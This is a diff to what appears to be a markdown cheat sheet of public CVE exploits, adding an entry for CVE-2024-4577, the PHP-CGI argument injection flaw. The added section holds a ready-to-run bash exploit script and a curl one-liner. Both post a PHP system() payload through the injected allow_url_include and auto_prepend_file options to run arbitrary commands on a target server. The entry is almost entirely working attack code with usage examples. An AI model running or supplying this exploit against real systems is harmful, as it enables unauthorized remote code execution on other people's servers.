@@ -32,6 +32,7 @@
 - [CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE](#cve-2023-46604-apache-activemq-openwire-transport-rce)
 - [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
 - [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
+- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
 - [CVE-2024-21378: Microsoft Outlook RCE](#cve-2024-21378-microsoft-outlook-rce)
 - [CVE-2024-21626: Leaky Vessels Container Escape](#cve-2024-21626-leaky-vessels-container-escape)
 - [CVE-2024-23897: Jenkins Arbitrary File Read](#cve-2024-23897-jenkins-arbitrary-file-read)
@@ -154,6 +155,7 @@
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
 | CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
 | CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
+| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/0xl0k1/CVE-2012-1823 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (1) | https://github.com/duy-31/CVE-2024-21413 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (2) | https://github.com/CMNatic/CVE-2024-21413 |
 | CVE-2024-21413 | Microsoft Outlook Moniker Link RCE (3) | https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability |
@@ -1341,6 +1343,49 @@ if __name__ == '__main__':
 
 ```c
 $ python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
+```
+
+## CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE
+
+> https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
+
+> https://github.com/0xl0k1/CVE-2012-1823
+
+```c
+#!/bin/bash
+
+function ctrl_c() {
+  echo -e "\n\n[!] Exiting..."
+  exit 1
+}
+
+trap ctrl_c SIGINT
+
+if [ $# -ne 2 ]; then
+    echo -e "\n[!] Usage: $0 <RHOST> \"<COMMAND>\""
+    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"
+    exit 1
+fi
+
+rhost=$1
+command=$2
+
+exploit() {
+    payload="<?php system('$command'); die(); ?>"
+
+    echo
+    curl -s -X POST "$rhost/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "$payload" --connect-timeout 10
+    
+    if [ $? -ne 0 ]; then
+        echo "[!] Exploit failed!"
+    fi
+}
+
+exploit
+```
+
+```c
+$ curl -s -X POST "<RHOST>/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('whoami'); die(); ?>" 
 ```
 
 ## CVE-2024-21378: Microsoft Outlook RCE
